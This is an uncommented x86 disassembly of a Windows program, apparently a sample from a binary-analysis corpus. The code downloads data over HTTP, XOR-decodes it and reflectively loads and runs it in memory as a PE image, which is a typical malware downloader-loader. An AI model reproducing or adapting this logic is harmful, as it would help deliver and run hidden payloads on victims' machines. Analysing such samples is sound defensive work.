sub_401000
push ebp
mov ebp esp
mov eax 0x19034
call sub_4018a0
push ebx
push esi
push edi
push 0x7
pop ecx
xor ebx ebx
mov [ ebp - 0x34 ] bl
xor eax eax
lea edi [ ebp - 0x33 ]
[ edi ]
push ebx
push ebx
push ebx
stosw [ edi ]
push ebx
push r--data
stosb [ edi ]
mov [ ebp - 0x8 ] 0x20
mov [ ebp - 0x14 ] 0x4
call [ InternetOpenA@IAT ]
mov esi eax
mov [ ebp - 0x4 ] esi
cmp esi ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push rw-data
push esi
call [ InternetOpenUrlA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
xor al al
jmp r-xdata
mov esi [ HttpQueryInfoA@IAT ]
push ebx
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x20000013
push edi
call esi
cmp [ ebp - 0x10 ] 0xc8
je r-xdata
push esi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push 0x5
push edi
call esi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
mov esi [ InternetCloseHandle@IAT ]
call esi
push edi
call esi
jmp r-xdata
mov esi [ ebp - 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
call [ atoi@IAT ]
pop ecx
mov esi eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov esi [ InternetCloseHandle@IAT ]
push edi
call esi
push [ ebp - 0x4 ]
call esi
mov al 0x1
lea eax [ ebp - 0xc ]
push eax
push 0x19000
lea eax [ ebp - 0x19034 ]
push eax
push edi
mov [ ebp - 0xc ] ebx
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
push 0x18fff
lea eax [ ebp - 0x19033 ]
push ebx
push eax
mov [ ebp - 0x19034 ] bl
call memset
add esp 0xc
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
mov ecx [ ecx ]
mov [ ebp + eax - 0x19034 ] bl
cmp ecx eax
ja r-xdata
push eax
lea eax [ ebp - 0x19034 ]
push eax
push [ ebp + 0x8 ]
call memcpy
add esp 0xc
mov eax ecx
sub_401146
push ebp
mov ebp esp
mov eax 0x19004
call sub_4018a0
push 0x19000
lea eax [ ebp - 0x19004 ]
push 0x0
push eax
call memset
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x19004 ]
push eax
call sub_401000
add esp 0x14
cmp al 0x1
jne r-xdata
xor edx edx
cmp [ ebp - 0x4 ] edx
jbe r-xdata
lea eax [ ebp - 0x19004 ]
push esi
push eax
call sub_4014df
mov esi eax
pop ecx
test esi esi
je r-xdata
lea ecx [ ebp + edx - 0x19004 ]
mov al [ ecx ]
test al al
je r-xdata
pop esi
leave
retn
call sub_4015fc
push 0x0
push r--data
call eax
pop ecx
pop ecx
call sub_401689
inc edx
cmp edx [ ebp - 0x4 ]
jb r-xdata
cmp al 0x58
je r-xdata
xor al 0x58
mov [ ecx ] al
sub_4011d5
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0x14 ]
push esi
lea esi [ ecx + eax + 0x28 ]
xor ecx ecx
cmp cx [ eax + 0x6 ]
jae r-xdata
pop esi
leave
retn
push ebx
push edi
mov edi [ VirtualAlloc@IAT ]
mov ebx 0x1000
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
mov ecx [ esi + 0x4 ]
push [ esi ]
add ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
push ecx
push eax
call memcpy
mov eax [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0xc ] eax
test eax eax
jle r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
pop edi
pop ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
movzx eax [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add esi 0x28
cmp [ ebp - 0x4 ] eax
jl r-xdata
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
push [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
push 0x0
push eax
call memset
jmp r-xdata
add esp 0xc
sub_401279
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x14 ]
and [ ebp - 0x4 ] 0x0
xor edx edx
lea ecx [ ecx + eax + 0x18 ]
cmp dx [ eax + 0x6 ]
jae r-xdata
leave
retn
push ebx
push esi
push edi
lea ebx [ ecx + 0x24 ]
lea ecx [ esi + ecx * 2 ]
lea ecx [ edi + ecx * 2 ]
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebx ]
test ecx 0x4000000
je r-xdata
push 0x4000
push [ ebx - 0x14 ]
push [ ebx - 0x1c ]
call [ VirtualFree@IAT ]
jmp r-xdata
mov esi [ ebx - 0x14 ]
test esi esi
jne r-xdata
or edi 0x200
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add ebx 0x28
cmp [ ebp - 0x4 ] ecx
jl r-xdata
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
lea ecx [ ebp - 0x8 ]
push ecx
push edi
push esi
push [ ebx - 0x1c ]
call eax
test cl 0x40
je r-xdata
mov esi [ ebx ]
mov edi [ ebx ]
mov ecx esi
shr ecx 0x1d
shr esi 0x1e
and ecx 0x1
and esi 0x1
shr edi 0x1f
test [ ebx ] 0x2000000
je r-xdata
pop edi
pop esi
pop ebx
test cl cl
jns r-xdata
mov esi [ eax + 0x20 ]
jmp r-xdata
mov esi [ eax + 0x24 ]
test esi esi
je r-xdata
sub_401349
push ebp
mov ebp esp
push ecx
push esi
mov esi [ eax + 0x4 ]
mov eax [ eax ]
cmp [ eax + 0xa4 ] 0x0
jbe r-xdata
pop esi
leave
retn
mov eax [ eax + 0xa0 ]
add eax esi
mov ecx [ eax ]
test ecx ecx
je r-xdata
push ebx
push edi
add eax [ eax + 0x4 ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
movzx ecx [ edx ]
mov ebx ecx
and ebx 0xfffff000
cmp ebx 0x3000
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ ecx + esi ]
mov ecx [ eax + 0x4 ]
sub ecx 0x8
lea edx [ eax + 0x8 ]
test ecx 0xfffffffe
jbe r-xdata
pop edi
pop ebx
mov ecx [ eax + 0x4 ]
inc [ ebp - 0x4 ]
sub ecx 0x8
shr ecx 0x1
add edx 0x2
cmp [ ebp - 0x4 ] ecx
jb r-xdata
mov ebx [ ebp + 0x8 ]
and ecx 0xfff
add [ ecx + edi ] ebx
sub_4013c4
push ebp
mov ebp esp
sub esp 0x10
mov eax [ edi ]
cmp [ eax + 0x84 ] 0x0
push ebx
mov ebx [ edi + 0x4 ]
mov [ ebp - 0xc ] 0x1
jbe r-xdata
mov eax [ ebp - 0xc ]
pop ebx
leave
retn
push esi
mov esi [ eax + 0x80 ]
push 0x14
add esi ebx
push esi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
pop esi
add esi 0x10
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov eax [ esi - 0x4 ]
test eax eax
je r-xdata
add eax ebx
push eax
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ edi + 0xc ]
lea eax [ eax * 4 + 0x4 ]
push eax
push [ edi + 0x8 ]
call [ realloc@IAT ]
pop ecx
pop ecx
mov [ edi + 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ eax + ecx * 4 ] edx
inc [ edi + 0xc ]
mov eax [ esi - 0x10 ]
test eax eax
je r-xdata
mov esi [ esi ]
add esi ebx
mov ecx esi
lea esi [ eax + ebx ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
add ecx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x4 ] ecx
sub [ ebp - 0x4 ] esi
test eax eax
mov eax [ esi ]
test eax eax
je r-xdata
add [ ebp - 0x8 ] 0x14
mov eax [ ebp - 0x8 ]
push 0x14
add eax 0xfffffff0
push eax
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
add eax ebx
add eax 0x2
and eax 0xffff
jmp r-xdata
mov esi [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x0
add esi 0x4
mov eax [ esi ]
test eax eax
jne r-xdata
push eax
push [ ebp - 0x10 ]
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + esi ] eax
mov eax ecx
cmp [ eax + esi ] 0x0
je r-xdata
jns r-xdata
jmp r-xdata
sub_4014df
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
push ebx
mov ebx [ eax + 0x3c ]
add ebx eax
cmp [ ebx ] 0x4550
je r-xdata
xor eax eax
leave
retn
push esi
mov esi [ VirtualAlloc@IAT ]
push edi
push 0x4
mov edi 0x2000
push edi
push [ ebx + 0x50 ]
push [ ebx + 0x34 ]
call esi
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push 0x14
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov eax [ ebp - 0x4 ]
push 0x4
xor ecx ecx
push 0x1000
mov [ edi + 0x4 ] eax
mov [ edi + 0xc ] ecx
mov [ edi + 0x8 ] ecx
mov [ edi + 0x10 ] ecx
push [ ebx + 0x50 ]
push eax
call esi
push 0x4
push 0x1000
push [ ebx + 0x54 ]
push [ ebp - 0x4 ]
call esi
mov ecx [ ebx + 0x54 ]
mov esi [ ebp + 0x8 ]
add ecx [ esi + 0x3c ]
mov [ ebp - 0x8 ] eax
push ecx
push esi
push eax
call memcpy
mov eax [ esi + 0x3c ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push edi
push ebx
mov [ edi ] eax
push esi
mov [ eax + 0x34 ] ecx
call sub_4011d5
mov esi [ ebp - 0x4 ]
mov eax esi
add esp 0x18
sub eax [ ebx + 0x34 ]
je r-xdata
push 0x4
push edi
push [ ebx + 0x50 ]
push eax
call esi
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
call sub_4013c4
test eax eax
je r-xdata
push eax
mov eax edi
call sub_401349
pop ecx
xor eax eax
jmp r-xdata
mov esi edi
call sub_401689
push edi
call sub_401279
mov eax [ edi ]
mov eax [ eax + 0x28 ]
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
mov eax edi
add eax esi
je r-xdata
push 0x0
xor ebx ebx
inc ebx
push ebx
push esi
call eax
test eax eax
jne r-xdata
mov [ edi + 0x10 ] ebx
sub_4015fc
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
xor edx edx
push ebx
push edi
mov [ ebp - 0x8 ] ecx
cmp [ eax + 0x7c ] edx
jne r-xdata
push esi
mov esi [ eax + 0x78 ]
add esi ecx
mov eax [ esi + 0x18 ]
cmp eax edx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
cmp [ esi + 0x14 ] edx
je r-xdata
pop edi
pop ebx
leave
retn
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
add edi ecx
add ebx ecx
mov [ ebp - 0x4 ] edx
cmp eax edx
ja r-xdata
mov eax [ edi ]
add eax ecx
push eax
push r--data
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
movzx eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x4
add ebx 0x2
cmp eax [ esi + 0x18 ]
jb r-xdata
cmp eax [ esi + 0x14 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ esi + 0x1c ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + ecx ]
add eax ecx
jmp r-xdata
pop esi
sub_401689
push ebx
xor ebx ebx
cmp esi ebx
je r-xdata
pop ebx
retn
cmp [ esi + 0x10 ] ebx
je r-xdata
cmp [ esi + 0x8 ] ebx
je r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
mov ecx [ ecx + 0x28 ]
push ebx
push ebx
push eax
add ecx eax
call ecx
mov [ esi + 0x10 ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
push edi
xor edi edi
cmp [ esi + 0xc ] ebx
jle r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x8000
push ebx
push eax
call [ VirtualFree@IAT ]
push [ esi + 0x8 ]
call [ free@IAT ]
pop ecx
pop edi
mov eax [ esi + 0x8 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] 0xffffffff
je r-xdata
inc edi
cmp edi [ esi + 0xc ]
jl r-xdata
push [ eax ]
call [ FreeLibrary@IAT ]
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40187d
cmp [ rw-data ] ebx
jne r-xdata
call sub_401868
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40187a
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4011cb
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4018a0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_4011cb
call sub_401146
xor eax eax
retn 0x10
sub_40184f
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401868
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40187a
xor eax eax
retn
sub_40187d
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
memcpy
jmp [ memcpy@IAT ]
memset
jmp [ memset@IAT ]
